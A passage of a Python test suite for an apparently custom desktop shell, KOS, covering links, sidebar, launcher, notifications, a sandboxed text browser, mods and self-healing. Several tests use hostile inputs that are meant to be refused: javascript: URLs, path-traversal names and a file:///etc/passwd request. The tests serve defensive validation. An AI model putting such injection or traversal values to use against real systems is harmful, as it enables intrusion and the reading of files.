        fx = self.layer(s, "effects", "overlay", [200, 200, 50, 50], [["rect", 0, 0, 20, 20, "#00ff00"]])
        fb = s.compose()
        self.assertIs(s._base, base)                                # an overlay changes the frame, not the base
        self.assertEqual(fb.pixel(205, 205), (0, 255, 0))
        a.rev += 1
        s.compose()
        self.assertIsNot(s._base, base)                             # a layer under it changed: rebuilt


def looks_module():
    from kos import looks
    return looks


def time_now():
    import time as _t
    return _t.monotonic()


class TestLinks(Env):
    def test_validation_normalises_and_refuses_what_is_not_a_link(self):
        from kos.links import LinkError, clean
        self.assertEqual(clean("url", "https://www.example.org/a/b")[2], "example.org")
        self.assertEqual(clean("file", "/home//me/notes.txt")[1:], ("/home/me/notes.txt", "notes.txt"))
        self.assertEqual(clean("folder", "/home/me/")[1], "/home/me")
        self.assertEqual(clean("app", "files")[1], "files")
        for bad in (("url", "javascript:alert(1)"), ("url", "ftp://x.org/f"), ("file", "relative/path"), ("file", "/a\x00b"),
                    ("app", "../evil"), ("app", "Has Caps"), ("thing", "x"), ("url", "https://a b")):
            with self.assertRaises(LinkError, msg=bad):
                clean(*bad)

    def test_the_store_seeds_pins_dedupes_caps_and_survives_a_hand_edited_file(self):
        from kos.links import MAX_LINKS, LinkError, Links
        store = Links(self.paths)
        self.assertEqual([l["title"] for l in store.list("desktop")], ["Files", "Terminal", "Editor", "Settings"])   # first run
        a = store.add("url", "https://example.org/x", "", "shelf")
        self.assertEqual(store.add("url", "https://example.org/x", "", "shelf")["id"], a["id"])                    # no duplicate
        self.assertEqual(len(store.list("shelf")), 1)
        self.assertTrue(store.remove(a["id"]))
        self.assertFalse(store.remove(a["id"]))
        store.file.write_text(json.dumps([{"kind": "url", "target": "javascript:x", "where": "shelf"},
                                          {"kind": "app", "target": "files", "where": "shelf"}, "junk", {"kind": "app"}]))
        self.assertEqual([l["target"] for l in store.list()], ["files"])                                          # bad entries dropped
        store.file.write_text("[]")
        for i in range(MAX_LINKS):
            store.add("file", f"/tmp/f{i}", "", "shelf")
        with self.assertRaises(LinkError):
            store.add("file", "/tmp/one-too-many", "", "shelf")

    def test_protocol_validation_for_links_tabs_notifications_and_keys(self):
        v = lambda **m: validate_app_message({"cmd": "request", **m}, "graphical")
        self.assertEqual(v(action="links", op="add", kind="url", target="https://a.org", where="desktop")["where"], "desktop")
        for bad in (dict(action="links", op="add", kind="exe", target="x"), dict(action="links", op="remove", id="../x"),
                    dict(action="links", op="add", kind="app", target="x", where="elsewhere"), dict(action="openlink", id="zz"),
                    dict(action="tab", name="settings"), dict(action="notify", op="dismiss", id="bad id!"),
                    dict(action="keys", on="yes"), dict(action="animate", on=1)):
            with self.assertRaises(ProtocolError, msg=bad):
                v(**bad)
        self.assertEqual(v(action="notify", title="Hi", body="there")["op"], "post")


class TestSidebarAndLauncher(Env):
    def make(self):
        from kos.shell import Shell
        return Shell(self.paths, self.authority(PW), HeadlessBackend(1280, 720), ScriptedDevices(), preboot=())

    def layer(self, sh, name, kind, **kw):
        from kos.shell import Layer, Z
        a, b = socket.socketpair()
        L = Layer(id=f"{name}-1", name=name, kind=kind, channel=Channel(a), mode="graphical",
                  rect=list(sh.core_rect(name)[1]) if name in __import__("kos.shell", fromlist=["KINDS"]).KINDS else [0, 0, 50, 50],
                  z=Z.get(kind, 21), **kw)
        sh.layers[L.id] = L
        L._peer = b
        self.addCleanup(lambda: (a.close(), b.close()))
        return L

    def sent(self, L):
        L._peer.setblocking(False)
        try:
            return [json.loads(x) for x in L._peer.recv(1 << 20).splitlines()]
        except BlockingIOError:
            return []

    def test_the_sidebar_is_tabs_on_top_content_in_the_middle_and_a_shelf_at_the_bottom(self):
        from kos.shell import SHELF_H, SIDE_TAB_H
        s = self.make()
        sx, sy, sw, sh = s.core_rect("sidebar")[1]
        self.assertEqual(sx + sw + 8 * s.u, s.W)                              # flush to the right edge
        self.assertGreaterEqual(sy, s.bar_h)
        self.assertLessEqual(sy + sh, s.H)
        for n, rect, shown in s.widget_plan():                                # widgets live between the tab strip and the shelf
            self.assertGreaterEqual(rect[1], sy + SIDE_TAB_H * s.u)
            if shown:
                self.assertLessEqual(rect[1] + rect[3], sy + sh - SHELF_H * s.u)
                self.assertGreaterEqual(rect[0], sx)
        self.assertTrue(any(shown for _, _, shown in s.widget_plan()))
        s.cfg["side_tab"] = "notifications"
        self.assertFalse(any(shown for _, _, shown in s.widget_plan()))      # the Notifications tab hides the widgets

    def test_choosing_a_tab_needs_the_shell_permission_hides_widgets_and_is_remembered(self):
        s = self.make()
        side = self.layer(s, "sidebar", "sidebar", system=True, shell=False)
        clock = self.layer(s, "widget-clock", "widget", system=False)
        s.relayout()
        self.assertTrue(clock.visible)
        s._on_request(side, {"cmd": "request", "action": "tab", "name": "notifications"})
        self.assertEqual(s.cfg["side_tab"], "widgets")                        # refused: no shell permission
        side.shell = True
        s._on_request(side, {"cmd": "request", "action": "tab", "name": "notifications"})
        self.assertEqual(s.cfg["side_tab"], "notifications")
        self.assertFalse(clock.visible)
        self.assertIn({"cmd": "tab", "name": "notifications"}, self.sent(side))
        self.assertEqual(self.make().cfg["side_tab"], "notifications")        # persisted

    def test_notifications_are_rate_limited_capped_pushed_and_dismissable(self):
        s = self.make()
        side = self.layer(s, "sidebar", "sidebar", system=True)
        self.sent(side)
        for i in range(12):
            s.notify("files", f"t{i}", "body")
        self.assertEqual(len([n for n in s.notes if n["app"] == "files"]), 5)    # 5 a second per app
        for i in range(80):
            s.notes.append({"id": f"n{i}", "app": f"a{i}", "title": "x", "body": "", "t": 0, "mono": 0})
        s.notify("other", "late", "body")
        self.assertLessEqual(len(s.notes), 50)
        last = [m for m in self.sent(side) if m["cmd"] == "notifications"][-1]
        self.assertEqual(last["notes"][-1]["title"], "late")
        self.assertNotIn("mono", last["notes"][-1])                              # internals are not leaked to apps
        s._on_request(side, {"cmd": "request", "action": "notify", "op": "dismiss", "id": last["notes"][-1]["id"], "title": "", "body": ""})
        self.assertNotIn("late", [n["title"] for n in s.notes])
        s._on_request(side, {"cmd": "request", "action": "notify", "op": "clear", "title": "", "body": ""})
        self.assertEqual(s.notes, [])
        plain = self.layer(s, "pins", "plain", system=False)
        s._on_request(plain, {"cmd": "request", "action": "notify", "op": "post", "title": "x", "body": "y"})
        self.assertEqual(s.notes, [])                                            # no 'system' permission: refused

    def test_links_go_to_system_apps_only_and_new_apps_are_told_the_current_state(self):
        from kos.links import Links
        s = self.make()
        pins = self.layer(s, "pins", "plain", system=True)
        sneaky = self.layer(s, "icons", "plain", system=False)
        s._on_request(pins, {"cmd": "request", "action": "links", "op": "add", "kind": "url", "target": "https://example.org", "title": "", "where": "shelf"})
        self.assertTrue(any(l["target"] == "https://example.org" for l in Links(self.paths).list("shelf")))
        got = [m for m in self.sent(pins) if m["cmd"] == "links"]
        self.assertTrue(got and any(l["where"] == "shelf" for l in got[-1]["links"]))
        self.assertEqual([m for m in self.sent(sneaky) if m["cmd"] == "links"], [])      # not a system app: nothing broadcast
        s._on_request(sneaky, {"cmd": "request", "action": "links", "op": "list"})
        self.assertEqual([m for m in self.sent(sneaky) if m["cmd"] == "links"], [])
        s._on_request(pins, {"cmd": "request", "action": "links", "op": "add", "kind": "url", "target": "javascript:x", "title": "", "where": "shelf"})
        self.assertFalse(any("javascript" in l["target"] for l in Links(self.paths).list()))

    def test_open_link_picks_the_right_app_and_hands_it_the_target(self):
        s = self.make()
        opened = []
        s.open_window = lambda name, command=None: opened.append((name, command))
        s.open_link({"kind": "app", "target": "settings"})
        s.open_link({"kind": "file", "target": "/home/me/a.txt"})
        s.open_link({"kind": "folder", "target": "/home/me"})
        s.open_link({"kind": "url", "target": "https://example.org"})
        self.assertEqual(opened, [("settings", None), ("editor", {"command": "open-file", "line": "/home/me/a.txt"}),
                                  ("files", {"command": "open-path", "line": "/home/me"}),
                                  ("browser", {"command": "open-url", "line": "https://example.org"})])

    def test_the_launcher_is_a_popup_the_super_key_toggles_it_keys_go_to_it_and_a_click_outside_closes_it(self):
        s = self.make()
        s.booted.add("mouse")
        lau = self.layer(s, "launcher", "popup", system=True, shell=True)
        lau.visible = False
        s.route({"type": "key", "key": "super"})
        self.assertTrue(lau.visible)
        self.assertIn({"cmd": "focus"}, self.sent(lau))                              # shown: told to reset its search
        s.route({"type": "key", "key": "a"})
        self.assertIn({"cmd": "key", "key": "a"}, self.sent(lau))                    # it holds the keyboard while open
        s.route({"type": "button", "button": "left", "pressed": True, "x": 5, "y": 700})
        self.assertFalse(lau.visible)                                                # a click outside closes it
        s.route({"type": "key", "key": "super"})
        s.route({"type": "key", "key": "super"})
        self.assertFalse(lau.visible)
        self.assertEqual(lau.rect[0] * 2 + lau.rect[2], s.W)                         # centred

    def test_a_text_box_can_take_the_keyboard_and_a_click_elsewhere_gives_it_back(self):
        s = self.make()
        s.booted.add("mouse")
        side = self.layer(s, "sidebar", "sidebar", system=True, shell=True)
        search = self.layer(s, "search", "plain", system=True)
        pins = self.layer(s, "pins", "plain", system=True)
        pins.rect[:] = [0, 300, 400, 200]
        self.sent(side), self.sent(search)
        s._on_request(side, {"cmd": "request", "action": "keys", "on": True})
        s.route({"type": "key", "key": "x"})
        self.assertIn({"cmd": "key", "key": "x"}, self.sent(side))
        self.assertEqual(self.sent(search), [])
        s.route({"type": "button", "button": "left", "pressed": True, "x": 100, "y": 400})   # a click on the pins
        self.assertIn({"cmd": "keys", "on": False}, self.sent(side))
        s.route({"type": "key", "key": "y"})
        self.assertIn({"cmd": "key", "key": "y"}, self.sent(search))
        plain = self.layer(s, "files", "plain", system=True, shell=False)
        s._on_request(plain, {"cmd": "request", "action": "keys", "on": True})
        self.assertIsNone(s.key_target)                                              # no 'shell' permission: refused


class TestBrowser(Env):
    """The text-mode browser, as a real sandboxed Node process, against a local web server."""

    def setUp(self):
        super().setUp()
        import shutil
        if not shutil.which("node") or not shutil.which("npm"):
            self.skipTest("needs node and npm")
        import http.server
        pages = {"/": b"<html><head><title>Home &amp; away</title><script>bad()</script></head><body><h1>Welcome</h1>"
                      b"<p>Read the <a href='/second'>second page</a> now. <a href='javascript:evil()'>nope</a></p></body></html>",
                 "/second": b"<html><title>Two</title><body><p>This is page two.</p></body></html>",
                 "/img": b"\x89PNG"}

        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                body = pages.get(self.path)
                if body is None:
                    self.send_response(404)
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "image/png" if self.path == "/img" else "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass
        self.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        self.base = f"http://127.0.0.1:{self.httpd.server_address[1]}"

    def tearDown(self):
        self.httpd.shutdown()
        self.httpd.server_close()
        super().tearDown()

    def test_it_shows_a_page_as_text_follows_numbered_links_and_refuses_what_it_cannot_show(self):
        import select as _sel
        import time as _t
        from kos.sandbox import SandboxPolicy
        out = Path(self.tmp.name) / "browser.kapp"
        pack(SYSTEM_DIR / "browser", out)
        kapp = KApp.from_file(out)
        self.assertEqual(kapp.manifest.permissions, ("network",))              # the only thing it asks for
        a, b = socket.socketpair()
        tmpd = Path("/dev/shm") / f"kos-test-br-{os.getpid()}"
        tmpd.mkdir(mode=0o755, exist_ok=True)
        os.chmod(tmpd, 0o755)
        plan = loader.plan(kapp, b.fileno(), "tui", tmpd)
        pol = SandboxPolicy(allow_network=True)
        loader.apply_to_policy(pol, kapp, tmpd)
        proc = loader.launch(plan, pol, None)
        b.close()
        send = lambda o: a.sendall(json.dumps(o).encode() + b"\n")
        state = {"buf": b"", "screen": None}

        def pump(secs):
            end = _t.time() + secs
            while _t.time() < end:
                if _sel.select([a], [], [], 0.2)[0]:
                    d = a.recv(65536)
                    if not d:
                        return
                    state["buf"] += d
                    while b"\n" in state["buf"]:
                        line, state["buf"] = state["buf"].split(b"\n", 1)
                        o = json.loads(line)
                        if o.get("cmd") == "screen":
                            state["screen"] = o
        text = lambda: "\n".join(state["screen"]["lines"]) + "\n" + state["screen"]["status"]
        try:
            send({"cmd": "hello", "mode": "tui", "width": 80, "height": 24})
            send({"cmd": "launch", "command": "open-url", "line": self.base + "/"})
            pump(3)
            self.assertIn("Home & away", text())
            self.assertIn("WELCOME", text())                                   # headings stand out
            self.assertIn("second page[1]", text())
            self.assertNotIn("bad()", text())                                  # scripts never reach the screen
            self.assertNotIn("evil", text())                                   # javascript: links are not links
            send({"cmd": "key", "key": "1"})
            send({"cmd": "key", "key": "enter"})
            pump(2)
            self.assertIn("This is page two.", text())
            send({"cmd": "key", "key": "b"})                                   # back
            pump(2)
            self.assertIn("WELCOME", text())
            send({"cmd": "launch", "command": "open-url", "line": self.base + "/img"})
            pump(2)
            self.assertIn("not a web page I can show", text())
            send({"cmd": "launch", "command": "open-url", "line": "file:///etc/passwd"})
            pump(1)
            self.assertIn("not an http(s) address", text())
        finally:
            a.close()
            proc.kill()
            import shutil
            shutil.rmtree(tmpd, ignore_errors=True)


class TestMods(Env):
    MODS = Path(__file__).resolve().parent.parent / "examples" / "mods"

    def install_mod(self, name, manifest_extra=None, src=None):
        src = Path(src or self.MODS / name)
        if manifest_extra is not None:                      # build a variant in a temp dir
            import shutil
            d = Path(tempfile.mkdtemp(dir=self.tmp.name)) / "src"
            shutil.copytree(src, d)
            m = json.loads((d / "manifest.json").read_text())
            m.update(manifest_extra)
            (d / "manifest.json").write_text(json.dumps(m))
            src = d
        out = Path(self.tmp.name) / f"{name}.kapp"
        pack(src, out)
        AppStore(self.paths).install(out, self.authority(PW))
        return KApp.from_file(out)

    def test_the_example_mods_are_valid_scan_clean_and_fit_their_slots(self):
        from kos.mods import check
        for name, slot in (("neon-wallpaper", "wallpaper"), ("ring-cursor", "cursor"), ("uptime-widget", "widget")):
            out = Path(self.tmp.name) / f"{name}.kapp"
            pack(self.MODS / name, out)
            self.assertTrue(scan_bytes(out.read_bytes(), name).clean)
            self.assertEqual(check(KApp.from_file(out)), slot)

    def test_a_mod_cannot_ask_for_more_than_its_slot_allows(self):
        from kos.mods import ModError, Mods, check
        app = self.install_mod("neon-wallpaper", {"name": "greedy-wallpaper", "permissions": ["system"]})
        with self.assertRaises(ModError) as cm:
            check(app)
        self.assertIn("wallpaper", str(cm.exception))
        with self.assertRaises(ModError):
            Mods(self.paths).enable("greedy-wallpaper")
        row = next(r for r in Mods(self.paths).installed() if r["name"] == "greedy-wallpaper")
        self.assertTrue(row["problem"])
        with self.assertRaises(ModError):                                    # an ordinary app is not a mod
            check(KApp.from_file(self.kapp))
        with self.assertRaises(ModError):
            Mods(self.paths).enable("not-installed")
        with self.assertRaises(KAppError):
            self.install_mod("neon-wallpaper", {"name": "bad-slot", "slot": "kernel"})

    def test_enabling_swaps_the_built_in_and_disabling_or_uninstalling_falls_back(self):
        from kos.mods import Mods, core_names
        self.install_mod("neon-wallpaper")
        mods = Mods(self.paths)
        base = ("wallpaper", "pins", "dock")
        self.assertEqual(core_names(self.paths, base, {"neon-wallpaper"}), ["wallpaper", "pins", "dock"])
        mods.enable("neon-wallpaper")
        self.assertEqual(core_names(self.paths, base, {"neon-wallpaper"}), ["neon-wallpaper", "pins", "dock"])
        self.assertEqual(core_names(self.paths, base, set()), ["wallpaper", "pins", "dock"])           # uninstalled: back to built-in
        mods.disable("neon-wallpaper")
        self.assertEqual(core_names(self.paths, base, {"neon-wallpaper"}), ["wallpaper", "pins", "dock"])
        mods.file.write_text(json.dumps({"slots": {"wallpaper": "x", "kernel": "evil"}, "widgets": [1, "w"]}))   # hand edits are sanitised
        self.assertNotIn("kernel", mods._load()["slots"])
        self.assertEqual(mods._load()["widgets"], ["w"])

    def test_widget_mods_add_widgets_up_to_a_cap(self):
        from kos.mods import MAX_WIDGET_MODS, ModError, Mods, core_names
        mods = Mods(self.paths)
        names = []
        for i in range(MAX_WIDGET_MODS + 1):
            n = f"wid-{i}"
            self.install_mod("uptime-widget", {"name": n})
            names.append(n)
            if i < MAX_WIDGET_MODS:
                mods.enable(n)
        with self.assertRaises(ModError):
            mods.enable(names[-1])
        self.assertEqual(core_names(self.paths, ("wallpaper",), set(names))[1:], names[:MAX_WIDGET_MODS])

    def test_enabling_asks_for_the_password_every_time_even_in_a_sudo_window_and_permits_the_mod(self):
        from kos.permit import PermitStore
        from kos.system import SystemBridge
        self.install_mod("ring-cursor")
        sent = []
        bridge = SystemBridge(self.paths)
        a = self.authority(PW)                                               # one password: for the sudo window
        a.sudo_open(5, ("interface", "app", "command"))
        with self.assertRaises(AssertionError):                              # it asked (the scripted prompter had no answer left)
            bridge.handle({"cmd": "request", "action": "mods", "op": "enable", "name": "ring-cursor"}, sent.append, a)
        self.assertFalse(PermitStore(self.paths).is_permitted("ring-cursor"))
        bridge.handle({"cmd": "request", "action": "mods", "op": "enable", "name": "ring-cursor"}, sent.append, self.authority(PW))
        self.assertEqual(sent[-1]["cmd"], "mods")
        self.assertTrue(next(m for m in sent[-1]["mods"] if m["name"] == "ring-cursor")["enabled"])
        self.assertTrue(PermitStore(self.paths).is_permitted("ring-cursor"))
        bridge.handle({"cmd": "request", "action": "mods", "op": "list"}, sent.append, self.authority())   # listing needs no password
        self.assertEqual(sent[-1]["cmd"], "mods")
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "request", "action": "mods", "op": "enable", "name": "../x"}, "graphical")

    def test_mods_are_not_offered_in_the_launcher_and_a_widget_mod_joins_the_sidebar(self):
        from kos.shell import Shell
        from kos.system import list_apps
        self.install_mod("neon-wallpaper")
        self.assertEqual(next(a for a in list_apps(self.paths) if a["name"] == "neon-wallpaper")["slot"], "wallpaper")
        s = Shell(self.paths, self.authority(PW), HeadlessBackend(1280, 720), ScriptedDevices(), preboot=())
        a, b = socket.socketpair()
        self.addCleanup(lambda: (a.close(), b.close()))
        inst = Instance(id="uptime-widget-x", name="uptime-widget", mode="graphical", broker_pid=0, sock_path="", log_path="", started=0)
        s._connect = lambda path: Channel(a)
        layer = s.add_core(inst, slot="widget")
        self.assertEqual((layer.slot, layer.kind), ("uptime-widget", "widget"))
        self.assertIn("uptime-widget", s.widget_names)
        self.assertIn("uptime-widget", s.layout["order"])
        self.assertIn("uptime-widget", [n for n, _, _ in s.widget_plan()])


class TestHeal(Env):
    def test_corrupt_preference_files_are_kept_aside_defaults_return_and_policy_never_loosens(self):
        from kos import heal
        from kos.auth import Policy
        (self.paths.state).mkdir(parents=True, exist_ok=True)
        (self.paths.state / "links.json").write_text("{ not json")
        (self.paths.state / "policy.json").write_text("\x00\x01garbage")
        (self.paths.state / "shell.json").write_text('{"look": "3d"}')            # valid: untouched
        kinds = {(f.kind, f.subject) for f in heal.check(self.paths).findings}
        self.assertEqual(kinds, {("corrupt-state", "links.json"), ("corrupt-state", "policy.json")})
        did = heal.quick(self.paths)
        self.assertEqual(len(did), 2)
        self.assertFalse((self.paths.state / "links.json").exists())
        kept = sorted(p.name for p in (self.paths.state / "quarantine").iterdir())
        self.assertTrue(any(k.startswith("links.json.") for k in kept))              # kept, not deleted
        self.assertEqual((next((self.paths.state / "quarantine").glob("links.json.*"))).read_text(), "{ not json")
        self.assertEqual(Policy(self.paths).interface(), "required")                 # the strict setting, never a looser one
        self.assertEqual(json.loads((self.paths.state / "shell.json").read_text())["look"], "3d")
        self.assertTrue(heal.check(self.paths).ok)

    def test_dead_instance_records_are_dropped(self):
        from kos import heal
        reg = Registry(self.paths)
        reg.write(Instance(id="hello-aaaaaa", name="hello", mode="tui", broker_pid=2 ** 22 + 1, sock_path=str(self.paths.state / "x.sock"),
                           log_path="", started=0, status="exited"))
        self.assertTrue(any(f.kind == "stale-instance" for f in heal.check(self.paths).findings))
        self.assertTrue(any("dead instance" in d for d in heal.quick(self.paths)))
        self.assertEqual(reg.list(), [])

    def test_repair_reinstalls_a_missing_or_tampered_builtin_but_will_not_guess_for_other_apps(self):
        from kos import heal
        store = AppStore(self.paths)
        for n in ("wallpaper", "pins"):
            out = Path(self.tmp.name) / f"{n}.kapp"
            pack(SYSTEM_DIR / n, out)
            store.install(out, self.authority(PW))
        store.install(self.kapp, self.authority(PW))                                   # hello: not a built-in
        (self.paths.apps / "wallpaper.kapp").unlink()                                  # missing
        (self.paths.apps / "pins.kapp").write_bytes((self.paths.apps / "pins.kapp").read_bytes() + b"x")      # tampered
        (self.paths.apps / "hello.kapp").write_bytes((self.paths.apps / "hello.kapp").read_bytes() + b"x")    # tampered, not built in
        builtin = ("wallpaper", "pins")
        self.assertTrue(any(f.kind == "missing-app" and f.subject == "wallpaper" for f in heal.check(self.paths, builtin=builtin).findings))
        rep = heal.repair(self.paths, None, builtin=builtin)                           # no authority: report only
        self.assertTrue(rep.left and not (self.paths.apps / "wallpaper.kapp").exists())
        rep = heal.repair(self.paths, self.authority(PW, PW, PW), builtin=builtin)     # seals, then the reinstall
        self.assertEqual(sorted(l for l in rep.fixed if l.startswith("reinstalled")),
                         ["reinstalled pins from the copy shipped with KOS", "reinstalled wallpaper from the copy shipped with KOS"])
        self.assertTrue(any("hello" in l and "not a built-in" in l for l in rep.left))      # reported, left alone
        grant = self.authority(PW).authorize("app.open", "pins")
        store.load_verified("pins", grant).manifest                                    # verifies again
        with self.assertRaises(Exception):
            store.load_verified("hello", self.authority(PW).authorize("app.open", "hello"))   # still not trusted

    def test_a_mod_that_no_longer_fits_its_slot_is_switched_off_with_the_password(self):
        from kos import heal
        from kos.mods import Mods
        import shutil
        d = Path(tempfile.mkdtemp(dir=self.tmp.name)) / "src"
        shutil.copytree(Path(__file__).resolve().parent.parent / "examples" / "mods" / "neon-wallpaper", d)
        m = json.loads((d / "manifest.json").read_text())
        m.update(name="greedy-wp", permissions=["system"])
        (d / "manifest.json").write_text(json.dumps(m))
        out = Path(self.tmp.name) / "greedy.kapp"
        pack(d, out)
        AppStore(self.paths).install(out, self.authority(PW))
        (self.paths.state).mkdir(parents=True, exist_ok=True)
        (self.paths.state / "mods.json").write_text(json.dumps({"slots": {"wallpaper": "greedy-wp"}, "widgets": []}))
        self.assertTrue(any(f.kind == "bad-mod" for f in heal.check(self.paths).findings))
        rep = heal.repair(self.paths, self.authority(PW, PW), builtin=())
        self.assertTrue(any("switched off mod greedy-wp" in l for l in rep.fixed))
        self.assertEqual(Mods(self.paths)._load()["slots"], {})


class TestSelfHealingDesktop(Env):
    def make(self, restarter):
        from kos.shell import Shell
        return Shell(self.paths, self.authority(PW), HeadlessBackend(960, 540), ScriptedDevices(), preboot=(), restarter=restarter)

    def core_layer(self, s, name, slot=None, kind="plain"):
        from kos.shell import Layer
        a, b = socket.socketpair()
        self.addCleanup(lambda: (a.close(), b.close()))
        L = Layer(id=f"{name}-1", name=name, kind=kind, channel=Channel(a), mode="graphical", rect=[0, 0, 10, 10], slot=slot or "")
        s.layers[L.id] = L
        return L

    def test_an_interface_app_that_stops_is_restarted_and_a_user_close_is_not(self):
        started = []
        s = self.make(lambda name: started.append(name) or Instance(id=f"{name}-new", name=name, mode="graphical", broker_pid=0,
                                                                      sock_path="", log_path="", started=0))
        s._connect = lambda p: Channel(socket.socketpair()[0])
        dock = self.core_layer(s, "dock", kind="dock")
        s.remove(dock.id)                                                       # it stopped: unexpected
        self.assertIn("dock", s._heal)
        self.assertTrue(any("stopped" in n["title"] for n in s.notes))
        s._run_heal(time_now() + 0.1)
        self.assertEqual(started, [])                                           # not before its delay
        s._run_heal(time_now() + 5)
        self.assertEqual(started, ["dock"])
        self.assertEqual(s._heal, {})
        self.assertTrue(any(l.slot == "dock" for l in s.layers.values()))
        win = self.core_layer(s, "files", kind="window")
        s.remove(win.id)                                                        # a window is never healed
        s.remove(next(l.id for l in s.layers.values() if l.slot == "dock"), expected=True)     # the user closed it
        self.assertEqual(s._heal, {})

    def test_a_refused_password_stops_the_retries_and_a_failing_mod_falls_back_to_the_builtin(self):
        from kos.auth import AuthorizationDenied
        def denied(name):
            raise AuthorizationDenied("cancelled")
        s = self.make(denied)
        s.remove(self.core_layer(s, "dock", kind="dock").id)
        s._run_heal(time_now() + 5)
        self.assertEqual(s._heal, {})                                           # no nagging
        self.assertTrue(any("was not restarted" in n["title"] for n in s.notes))
        calls = []
        def failing(name):
            calls.append(name)
            if name == "fancy-wallpaper":
                raise RuntimeError("boom")
            return Instance(id="wallpaper-new", name=name, mode="graphical", broker_pid=0, sock_path="", log_path="", started=0)
        s2 = self.make(failing)
        s2._connect = lambda p: Channel(socket.socketpair()[0])
        s2.remove(self.core_layer(s2, "fancy-wallpaper", slot="wallpaper", kind="wallpaper").id)
        t = time_now()
        for i in range(6):
            s2._run_heal(t + 100 * (i + 1))
        self.assertEqual(calls[:3], ["fancy-wallpaper"] * 3)
        self.assertEqual(calls[3], "wallpaper")                                 # after three failures: the built-in
        self.assertTrue(any("keeps failing" in n["title"] for n in s2.notes))

    def test_no_restarter_means_no_healing_so_tests_and_tools_are_unaffected(self):
        s = self.make(None)
        s.remove(self.core_layer(s, "dock", kind="dock").id)
        self.assertEqual(s._heal, {})


class TestMultiples(Env):
    """Several seats, desktops and instances at once."""

    def make(self, opener=None):
        from kos.shell import Shell
        s = Shell(self.paths, self.authority(PW), HeadlessBackend(960, 540), ScriptedDevices(), preboot=(), opener=opener,
                  modes_of=lambda n: ["graphical"])
        s.booted.add("mouse")
        return s

    def window(self, s, name, rect=(100, 100, 300, 200), ws=None):
        from kos.shell import Layer
        a, b = socket.socketpair()
        self.addCleanup(lambda: (a.close(), b.close()))
        L = Layer(id=f"{name}-w", name=name, kind="window", channel=Channel(a), mode="graphical", rect=list(rect),
                  z=s._raise_z(), ws=s.ws if ws is None else ws)
        s.layers[L.id] = L
        L._peer = b
        return L

    def sent(self, L):
        L._peer.setblocking(False)
        try:
            return [json.loads(x) for x in L._peer.recv(1 << 20).splitlines()]
        except BlockingIOError:
            return []

    def test_two_seats_have_their_own_pointer_focus_and_keyboard(self):
        s = self.make()
        a = self.window(s, "files", (50, 50, 300, 200))
        b = self.window(s, "editor", (500, 50, 300, 200))
        s.route({"type": "pointer", "x": 100, "y": 100, "seat": 0})
        s.route({"type": "button", "button": "left", "pressed": True, "x": 100, "y": 100, "seat": 0})
        s.route({"type": "pointer", "x": 600, "y": 100, "seat": 1})
        s.route({"type": "button", "button": "left", "pressed": True, "x": 600, "y": 100, "seat": 1})
        self.assertEqual((s.seats[0].focus, s.seats[1].focus), (a.id, b.id))        # each seat focused its own window
        self.assertEqual((s.seats[0].pointer, s.seats[1].pointer), ((100, 100), (600, 100)))
        self.sent(a), self.sent(b)
        s.route({"type": "key", "key": "x", "seat": 0})
        s.route({"type": "key", "key": "y", "seat": 1})
        self.assertEqual([m["key"] for m in self.sent(a) if m["cmd"] == "key"], ["x"])        # each keyboard types into its own seat's window
        self.assertEqual([m["key"] for m in self.sent(b) if m["cmd"] == "key"], ["y"])
        self.assertEqual({w["id"] for w in [{"id": i} for i in s.focused_ids()]}, {a.id, b.id})
        s.remove(a.id, expected=True)
        self.assertIsNone(s.seats[0].focus)
        self.assertEqual(s.seats[1].focus, b.id)
        self.assertEqual(s.seat(99).id, 0)                                          # an unknown seat number is seat 0
        self.assertEqual(s._seat.id, 0)                                             # outside route() the shell is back on seat 0

    def test_a_second_seat_is_drawn_by_the_os_and_never_moves_the_cursor_app_or_tilt(self):
        s = self.make()
        s.set_look(look="3d")
        s.route({"type": "pointer", "x": 300, "y": 300, "seat": 1})
        s.route({"type": "pointer", "x": 700, "y": 300, "seat": 1})
        self.assertEqual(s.tilt_target, [0.0, 0.0])
        self.assertEqual(s.seats[0].pointer, (480, 270))
        fb = s.compose().copy()
        s.render()
        self.assertTrue(len(s.backend.frames) >= 1)
        shown = s.backend.frames[-1]
        self.assertEqual(shown.pixel(700 + 14 * s.u, 300 + 14 * s.u), (0xe8, 0xa3, 0x17))   # the seat's coloured badge is on screen

    def test_evdev_events_carry_the_seat_of_the_device_that_made_them(self):
        from kos.devices import EV_KEY, EV_SYN, EvdevDevices
        import struct as _st
        d = EvdevDevices.__new__(EvdevDevices)
        d.w, d.h, d._fds, d._seat = 960, 540, [], {}
        d._tr = {10: __import__("kos.devices", fromlist=["EvdevTranslator"]).EvdevTranslator(960, 540),
                 11: __import__("kos.devices", fromlist=["EvdevTranslator"]).EvdevTranslator(960, 540)}
        d._seat = {10: 0, 11: 2}
        raw = INPUT_EVENT.pack(0, 0, EV_KEY, 30, 1)
        os_read = os.read
        try:
            os.read = lambda fd, n: raw
            self.assertEqual(d.read(10), [{"type": "key", "key": "a"}])             # seat 0 stays untagged
            self.assertEqual(d.read(11), [{"type": "key", "key": "a", "seat": 2}])
        finally:
            os.read = os_read

    def test_windows_live_on_a_desktop_and_switching_shows_only_that_desktops_windows(self):
        s = self.make()
        w1 = self.window(s, "files")
        s.route({"type": "key", "key": "ctrl-2"})
        self.assertEqual(s.ws, 1)
        w2 = self.window(s, "editor", (100, 100, 300, 200))
        self.assertIsNone(s.at(150, 150) if s.at(150, 150) is not w2 else None)       # w2 is the one under the pointer here
        self.assertIs(s.at(150, 150), w2)
        self.assertFalse(s.shown(w1))
        self.assertEqual([c.layer for c in s.controls() if c.kind == "focus"], [w2.id])
        s.route({"type": "key", "key": "ctrl-1"})
        self.assertIs(s.at(150, 150), w1)
        s.raise_window(w2)                                                           # asking for a window on another desktop goes there
        self.assertEqual(s.ws, 1)
        self.assertEqual(s.seats[0].focus, w2.id)
        s.move_to_workspace(w2, 3)
        self.assertFalse(s.shown(w2))
        self.assertIsNone(s.seats[0].focus)
        s.set_workspace(99)
        self.assertEqual(s.ws, 3)                                                    # clamped to the last desktop
        for bad in (dict(n=7), dict(n=-1), dict(n=1, id="Bad Id!")):
            with self.assertRaises(ProtocolError):
